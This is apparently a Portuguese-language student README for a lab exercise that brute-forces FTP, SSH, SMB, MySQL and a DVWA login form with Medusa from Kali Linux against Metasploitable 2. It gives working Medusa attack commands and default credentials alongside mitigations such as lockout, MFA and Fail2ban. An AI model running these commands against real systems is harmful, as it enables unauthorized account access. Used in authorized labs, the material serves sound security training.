# 🛡️ Simulando um Ataque de Brute Force com Medusa e Kali Linux

Projeto prático de **auditoria de segurança em ambiente controlado**, demonstrando ataques de
**força bruta** contra diferentes serviços (FTP, SSH, SMB e formulário web) usando a ferramenta
**Medusa** no **Kali Linux**. O objetivo é entender, na prática, como senhas fracas e credenciais
padrão são exploradas por atacantes — e, principalmente, **como se defender**.

> ⚠️ **Aviso legal / Uso ético**
> Todo o conteúdo deste repositório foi executado em um **laboratório isolado e autorizado**
> (máquinas virtuais próprias, em rede host-only). Ataques de força bruta contra sistemas de
> terceiros **sem autorização expressa são crime** no Brasil (Lei 12.737/2012 — "Lei Carolina
> Dieckmann"). Use este material **exclusivamente** para fins educacionais e em ambientes que
> você controla.

---

## 📑 Sumário

- [Estrutura do Repositório](#-estrutura-do-repositório)
- [Objetivos de Aprendizagem](#-objetivos-de-aprendizagem)
- [Ambiente de Laboratório](#-ambiente-de-laboratório)
- [O que é Força Bruta?](#-o-que-é-força-bruta)
- [Por que Medusa?](#-por-que-medusa)
- [Wordlists do Projeto](#-wordlists-do-projeto)
- [Metodologia do Ataque](#️-metodologia-do-ataque)
- [Anatomia do Comando Medusa](#-anatomia-do-comando-medusa)
- [Ataque por Serviço](#-ataque-por-serviço)
- [Interpretando os Resultados](#-interpretando-os-resultados)
- [Mitigações (Como se Defender)](#️-mitigações-como-se-defender)
- [Medusa vs Hydra vs Ncrack](#-medusa-vs-hydra-vs-ncrack)
- [Lições Aprendidas](#-lições-aprendidas)
- [Referências](#-referências)

---

## 📁 Estrutura do Repositório

```
wordlists_medusa/
├── README.md          # Esta documentação (metodologia, comandos e mitigações)
├── usuarios.txt       # Wordlist de usuários comuns + defaults do Metasploitable 2
├── senhas.txt         # Wordlist de senhas fracas clássicas + credenciais padrão
└── brute_force.sh     # Script que automatiza os ataques Medusa (FTP, SSH e SMB)
```

| Arquivo | Descrição |
|---|---|
| [`README.md`](./README.md) | Documentação completa do projeto |
| [`usuarios.txt`](./usuarios.txt) | Lista de nomes de usuário para o ataque de dicionário |
| [`senhas.txt`](./senhas.txt) | Lista de senhas para o ataque de dicionário |
| [`brute_force.sh`](./brute_force.sh) | Automatiza o Medusa contra FTP, SSH e SMB e salva os logs |

> ▶️ **Como usar o script**: ajuste a variável `ALVO` no topo do arquivo, dê permissão de
> execução e rode:
> ```bash
> chmod +x brute_force.sh
> ./brute_force.sh
> ```

---

## 🎯 Objetivos de Aprendizagem

Ao concluir este desafio, fui capaz de:

- Compreender ataques de **força bruta** em diferentes serviços (FTP, Web, SMB, SSH);
- Utilizar o **Kali Linux** e o **Medusa** para auditoria de segurança em ambiente controlado;
- Construir e organizar **wordlists** de usuários e senhas;
- Documentar processos técnicos de forma clara e estruturada;
- Reconhecer vulnerabilidades comuns e propor **medidas de mitigação** eficazes;
- Utilizar o **GitHub** como portfólio técnico para compartilhar conhecimento.

---

## 🧰 Ambiente de Laboratório

| Componente | Função | Detalhe |
|---|---|---|
| **Kali Linux** | Máquina atacante | Distribuição com Medusa e Nmap pré-instalados |
| **Metasploitable 2** | Máquina alvo | VM propositalmente vulnerável, ideal para treino |
| **DVWA** | Alvo web | *Damn Vulnerable Web Application* (login form) |
| **VirtualBox / VMware** | Virtualização | Hospeda as VMs |
| **Rede** | Isolamento | Host-only / rede interna (sem acesso à internet) |

**IPs usados nos exemplos** (ajuste para o seu ambiente):

- Atacante (Kali): `192.168.56.102`
- Alvo (Metasploitable 2): `192.168.56.101`

> 💡 Descubra o IP do alvo rodando `ip a` dentro da VM alvo, ou faça uma varredura na rua com
> `nmap -sn 192.168.56.0/24` a partir do Kali.

---

## 🔍 O que é Força Bruta?

**Força bruta** (*brute force*) é a tentativa sistemática de adivinhar credenciais, testando
muitas combinações de usuário e senha até encontrar uma válida. É eficaz principalmente contra:

- **Senhas fracas** (`123456`, `admin`, `password`...);
- **Credenciais padrão** de fábrica que nunca foram trocadas;
- Serviços **sem bloqueio por tentativas** (lockout) nem *rate limiting*.

### Variações comuns

| Tipo | Como funciona |
|---|---|
| **Força bruta pura** | Testa *todas* as combinações possíveis de caracteres (lento) |
| **Ataque de dicionário** | Testa palavras de uma **wordlist** (rápido e usado aqui) |
| **Password Spraying** | Uma senha comum contra *muitos* usuários (evita lockout) |
| **Credential Stuffing** | Reutiliza credenciais vazadas de outros sites |

Este projeto usa principalmente o **ataque de dicionário**.

---

## ⚙️ Por que Medusa?

**Medusa** é um brute-forcer **paralelo, modular e rápido** para login. Suas características:

- **Paralelismo**: testa vários hosts/usuários/senhas simultaneamente (threads);
- **Modular**: cada protocolo é um módulo (`.mod`) carregado via `-M`;
- **Flexível**: suporta FTP, SSH, SMB, HTTP(S), MySQL, PostgreSQL, VNC, RDP, Telnet e muitos outros.

Listar os módulos disponíveis:

```bash
medusa -d
```

---

## 📂 Wordlists do Projeto

As listas **pequenas** criadas para este laboratório estão neste repositório (rodam rápido e
já contêm as credenciais padrão do Metasploitable 2):

- [`usuarios.txt`](./usuarios.txt) — nomes de usuário comuns + defaults do alvo
- [`senhas.txt`](./senhas.txt) — senhas fracas clássicas + credenciais padrão

### Wordlists "reais" já incluídas no Kali

Para auditorias sérias, o Kali traz coleções enormes prontas para uso:

```bash
/usr/share/wordlists/rockyou.txt      # ~14 milhões de senhas (descompacte com: gunzip rockyou.txt.gz)
/usr/share/wordlists/metasploit/      # usuários e senhas do framework Metasploit
/usr/share/seclists/                  # SecLists — a coleção mais completa (sudo apt install seclists)
```

> A estratégia inteligente: usar as **listas pequenas** para validar o método rapidamente no
> lab, e **citar/usar as grandes** (rockyou, SecLists) quando o cenário exigir mais fôlego.

---

## 🗺️ Metodologia do Ataque

```
┌──────────────┐    ┌───────────────┐    ┌──────────────┐    ┌──────────────┐
│ 1. Recon     │ →  │ 2. Preparar   │ →  │ 3. Executar  │ →  │ 4. Validar   │
│    (Nmap)    │    │   wordlists   │    │   Medusa     │    │   acesso     │
└──────────────┘    └───────────────┘    └──────────────┘    └──────────────┘
```

1. **Reconhecimento** — mapear os serviços abertos no alvo;
2. **Preparação** — montar/escolher as wordlists de usuários e senhas;
3. **Execução** — rodar o Medusa contra cada serviço;
4. **Validação** — usar a credencial encontrada para acessar o serviço e confirmar.

### 1. Reconhecimento com Nmap

```bash
nmap -sV -p- 192.168.56.101
```

Serviços típicos do Metasploitable 2:

| Porta | Serviço |
|---|---|
| 21 | FTP (vsftpd) |
| 22 | SSH |
| 23 | Telnet |
| 139 / 445 | SMB (Samba) |
| 80 | HTTP (Apache) |
| 3306 | MySQL |

---

## 🧩 Anatomia do Comando Medusa

```bash
medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -f -t 4 -O resultado_ftp.txt
```

| Flag | Significado |
|---|---|
| `-h` | **Host** alvo (use `-H` para um arquivo com vários hosts) |
| `-u` | Um **usuário** único (minúsculo) |
| `-U` | Arquivo com **lista de usuários** (maiúsculo) |
| `-p` | Uma **senha** única (minúsculo) |
| `-P` | Arquivo com **lista de senhas** (maiúsculo) |
| `-M` | **Módulo**/protocolo (ftp, ssh, smbnt, web-form...) |
| `-m` | Parâmetros **extras do módulo** (ex.: caminho do form) |
| `-f` | **Para** assim que encontra o primeiro par válido no host |
| `-F` | Para assim que encontra qualquer par válido em qualquer host |
| `-t` | Número de **threads** (4 é seguro; alto demais derruba a conexão) |
| `-O` | Salva o **log** em arquivo |
| `-n` | Porta customizada (se o serviço não estiver na porta padrão) |
| `-v` | Nível de **verbosidade** (ex.: `-v 6` para depurar) |

> 🧠 **Macete**: `-u`/`-p` minúsculos = valor único; `-U`/`-P` maiúsculos = arquivo (lista).

---

## 💥 Ataque por Serviço

### FTP (porta 21)

```bash
medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -f -t 4 -O resultado_ftp.txt
```

✅ Resultado esperado no Metasploitable 2: **`msfadmin : msfadmin`**.

### SSH (porta 22)

```bash
medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ssh -f -t 4
```

> O SSH é **lento** de propósito (o próprio protocolo atrasa tentativas). Mantenha poucas
> threads (`-t 4`) — com muitas, o OpenSSH derruba as conexões e dá a falsa impressão de "travou".

### SMB (portas 139 / 445)

```bash
medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M smbnt -f
```

### Formulário Web — DVWA (HTTP POST)

```bash
medusa -h 192.168.56.101 -u admin -P senhas.txt -M web-form \
  -m FORM:"/dvwa/login.php" \
  -m DENY-SIGNAL:"Login failed"
```

> O `DENY-SIGNAL` é o **texto que a página mostra quando a senha está ERRADA**. É assim que o
> Medusa diferencia sucesso de falha num formulário. Ajuste o caminho do form e os nomes dos
> campos conforme o HTML do alvo (inspecione o `<form>` no navegador).

### MySQL (porta 3306) — bônus

```bash
medusa -h 192.168.56.101 -u root -P senhas.txt -M mysql -f
```

---

## 📊 Interpretando os Resultados

Quando o Medusa encontra uma credencial válida, a saída traz `[SUCCESS]`:

```
ACCOUNT CHECK: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```

- `[SUCCESS]` → credencial **válida** (é o que importa!);
- `[ERROR]` → problema de conexão/módulo (não é senha errada);
- Sem `[SUCCESS]` → nenhuma senha da wordlist funcionou (tente uma lista maior).

**Validando o acesso** (prova de que funcionou):

```bash
ftp 192.168.56.101        # faz login com msfadmin:msfadmin
ssh msfadmin@192.168.56.101
```

---

## 🛡️ Mitigações (Como se Defender)

Documentar o ataque só tem valor real se eu souber **impedi-lo**. Contra força bruta:

| Defesa | Por que funciona |
|---|---|
| **Senhas fortes** (12+, maiúsc./minúsc./números/símbolos) | Inviabiliza wordlists comuns |
| **Account Lockout** (bloqueio por N tentativas) | Trava a conta antes do atacante acertar |
| **Rate limiting** | Reduz a velocidade das tentativas |
| **MFA / 2FA** | Mesmo com a senha certa, o atacante não entra |
| **Fail2ban** | Bane o IP após tentativas repetidas (ótimo p/ SSH e FTP) |
| **Trocar credenciais padrão** | Elimina alvos óbvios (`admin:admin`, `msfadmin:msfadmin`) |
| **Desabilitar serviços desnecessários** | Reduz a superfície de ataque |
| **Restringir por firewall / VPN** | Só quem precisa alcança o serviço |
| **Monitoramento / SIEM** | Alerta sobre picos de falhas de login (detecção precoce) |
| **CAPTCHA** (em logins web) | Barra ferramentas automatizadas |

### Exemplo prático: Fail2ban para SSH

```bash
sudo apt install fail2ban
# Bane o IP por 10 min após 5 tentativas falhas
sudo nano /etc/fail2ban/jail.local
```

```ini
[sshd]
enabled  = true
maxretry = 5
bantime  = 600
findtime = 600
```

---

## ⚔️ Medusa vs Hydra vs Ncrack

| Característica | **Medusa** | **Hydra** | **Ncrack** |
|---|---|---|---|
| Velocidade | Muito rápida | Muito rápida | Rápida |
| Paralelismo | Excelente | Excelente | Bom |
| Estabilidade em sessão longa | Alta | Média | Alta |
| Integração | — | — | Família Nmap |
| Sintaxe de senha única | `-p` | `-p` | `--pass` |

> As três resolvem o mesmo problema; a escolha costuma ser preferência pessoal e estabilidade
> em alvos específicos. Vale conhecer as três.

---

## 📝 Lições Aprendidas

- **Credenciais padrão são o elo mais fraco** — a maioria dos comprometimentos começa aí.
- **Threads demais atrapalham**: em SSH/FTP, `-t 4` costuma render mais que `-t 32`.
- **Recon vem antes do ataque**: sem saber o serviço/versão (Nmap), o brute force é cego.
- **Defender > atacar**: todo vetor estudado tem uma mitigação direta e barata (MFA, lockout, fail2ban).
- **Wordlist certa > wordlist grande**: uma lista pequena e contextualizada acerta antes.

---

## 📚 Referências

- [Kali Linux — Site Oficial](https://www.kali.org/)
- [Medusa — Repositório Oficial](https://github.com/jmk-foofus/medusa)
- [Metasploitable 2 — Documentação (Rapid7)](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [DVWA — Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [Nmap — Manual Oficial](https://nmap.org/book/man.html)
- [OWASP — Brute Force Attack](https://owasp.org/www-community/attacks/Brute_force_attack)
- [SecLists — Wordlists](https://github.com/danielmiessler/SecLists)

---

*Projeto desenvolvido como parte da trilha de estudos em Pentest / Segurança Ofensiva.
Uso estritamente educacional, em ambiente de laboratório autorizado.*
